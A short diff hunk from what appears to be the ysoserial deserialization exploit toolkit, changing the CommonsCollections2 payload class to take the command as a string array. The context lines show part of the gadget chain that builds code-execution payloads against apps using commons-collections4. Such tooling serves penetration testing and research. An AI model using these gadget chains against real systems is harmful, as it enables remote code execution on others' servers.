@@ -27,7 +27,7 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 
-	public Queue<Object> getObject(final String command) throws Exception {
+	public Queue<Object> getObject(final String[] command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
 		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
